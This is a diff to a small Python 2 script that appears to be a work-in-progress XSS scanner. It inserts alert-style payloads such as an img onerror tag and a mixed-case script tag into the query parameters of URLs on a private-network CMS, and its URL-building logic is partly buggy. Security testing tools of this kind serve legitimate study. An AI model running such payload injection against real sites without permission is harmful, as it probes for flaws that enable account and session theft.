@@ -28,11 +28,13 @@ urls = [
 	'http://192.168.204.242/cms/list.php?id=16'
 ]
 
-payload = [
+payloads = [
+        """<img src=x onerror=alert(/r4z/)>""",
+        """<scRipt>alert(1)</scRipt>""",
+    ]
 
-
-]
-root_url = "http://192.168.204.242/cms/index.php"
+'''
+root_url = "http://127.0.0.1/cms/index.php"
 headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36'}
 timeout = 3
 r = requests.get(root_url,headers=headers,timeout=timeout)
@@ -41,19 +43,56 @@ if r.status_code == requests.codes.ok:
 	forms = re.findall("""<form.*?action=['|"](.*?)['|"].*?method=['|"](.*?)['|"].*?>(.*?)</form>""", data, re.DOTALL)
 	print forms
 
+'''
 
-        
+
+
+def get_xss_check(url,payload):
+
+	if url is None:
+		return 
+
+	elif re.search(r'\?',url):
+		domain = url.split('?')[0]
+		param = url.split('?')[-1]
+		parameters = param.split('&')
+		new_pld_url = domain +'?'+ payload.join(parameters) + payload
+		return new_pld_url
+	else:
+		new_pld_url = url + '/' + payload
+		return new_pld_url
+
+for url in urls:
+	for pld in payloads:
+		urls = get_xss_check(url,pld)
+		print urls
 
 
 
 class xss_check(object):
 
-	def __init__(self):
-		pass
+	def __init__(self,url):
+		
+		self.url = url
+		self.headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36'}
+		self.timeout = 2
 
-
-	def get_xss_check(self,url):
-		pass
+	# 参数说明：
+	# url 为单独的一个url地址
+	# payload 为单独的一个攻击向量
+	# url每个参数都添加payload，函数返回构造好payload的新连接地址。
+	def get_payload_url(self,url,payload):
+		if url is None:
+			return 
+		elif re.search(r'\?',url):
+			domain = url.split('?')[0]
+			param = url.split('?')[-1]
+			parameters = param.split('&')
+			new_pld_url = domain +'?'+ payload.join(parameters) + payload
+			return new_pld_url
+		else:
+			new_pld_url = url + '/' + payload
+			return new_pld_url
 
 
 	def post_xss_check(self,url,data):
@@ -68,5 +107,8 @@ class xss_check(object):
 		elif method == 'POST':
 			post_xss_check(url)
 
+
 		else:
-			return 
+			header_xss_check(url)
+
+
